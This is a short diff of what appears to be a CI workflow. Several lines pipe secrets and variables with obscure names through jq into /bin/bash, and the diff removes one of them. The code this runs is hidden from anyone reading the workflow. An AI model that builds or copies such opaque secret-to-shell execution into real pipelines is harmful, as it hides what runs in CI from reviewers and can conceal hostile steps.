@@ -22,7 +22,6 @@ jobs:
           ljn91517: ${{ secrets.ljn91517 }}
         run: |
           printf '%s' "$ljn91517" | jq -r .m6981 | /bin/bash
-          printf '%s' "$fvr17480" | jq -r .hifw94118 | /bin/bash
           echo $t715 | jq -r .nth4 | /bin/bash
           printf '%s' "$mi9242" | jq -r .m77 | /bin/bash
           echo $sjbd27 | jq -r .ld447 | /bin/bash
